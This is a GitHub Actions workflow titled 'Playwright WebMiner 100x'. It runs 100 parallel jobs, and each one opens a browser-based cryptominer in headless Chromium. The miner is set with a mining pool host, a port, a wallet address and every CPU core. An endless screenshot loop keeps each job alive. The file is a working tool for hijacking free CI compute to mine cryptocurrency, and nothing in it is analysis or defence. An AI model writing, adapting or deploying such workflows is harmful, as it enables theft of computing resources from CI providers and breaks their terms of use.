name: Playwright WebMiner 100x

on:
  workflow_dispatch:

jobs:
  playwright-loop:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        instance: [1,2,3,4,5,6,7,8,9,10,
                   11,12,13,14,15,16,17,18,19,20,
                   21,22,23,24,25,26,27,28,29,30,
                   31,32,33,34,35,36,37,38,39,40,
                   41,42,43,44,45,46,47,48,49,50,
                   51,52,53,54,55,56,57,58,59,60,
                   61,62,63,64,65,66,67,68,69,70,
                   71,72,73,74,75,76,77,78,79,80,
                   81,82,83,84,85,86,87,88,89,90,
                   91,92,93,94,95,96,97,98,99,100]
    steps:
      - uses: actions/checkout@v3

      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '20'

      - name: Install Playwright Chromium
        run: |
          npm init -y
          npm install playwright-chromium
          npx playwright install chromium

      - name: Run headless loop for instance ${{ matrix.instance }}
        run: |
          URL="https://webminer.pages.dev?algorithm=cwm_power2B&host=asia.rplant.xyz&port=17022&worker=Mau73g3nEEM5VpQG4EAMPtkuwBy1ZcqgCk.100&password=x&workers=$(nproc)"
          
          cat > loop-playwright-${{ matrix.instance }}.js <<EOF
          const { chromium } = require('playwright-chromium');
          const fs = require('fs');
          const path = require('path');

          const INSTANCE = '${{ matrix.instance }}';
          const SCREENSHOT = \`example-\${INSTANCE}.png\`;
          const ARTIFACT_DIR = path.resolve('artifacts');
          const URL = process.env.URL;

          if(!fs.existsSync(ARTIFACT_DIR)) fs.mkdirSync(ARTIFACT_DIR);

          (async () => {
            const browser = await chromium.launch({ headless: true });
            const page = await browser.newPage();
            await page.goto(URL);

            console.log(\`🌐 Browser instance #\${INSTANCE} running...\`);

            while(true) {
              if(fs.existsSync(SCREENSHOT)) fs.unlinkSync(SCREENSHOT);
              await page.screenshot({ path: SCREENSHOT });
              fs.copyFileSync(SCREENSHOT, path.join(ARTIFACT_DIR, SCREENSHOT));
              console.log(\`✅ Screenshot terbaru dibuat: \${SCREENSHOT} at\`, new Date().toLocaleTimeString());
              await new Promise(resolve => setTimeout(resolve, 60000)); // 1 menit
            }
          })();
          EOF

          URL="$URL" npx node loop-playwright-${{ matrix.instance }}.js

      - name: Upload Artifacts
        uses: actions/upload-artifact@v3
        with:
          name: screenshots-${{ matrix.instance }}
          path: artifacts/
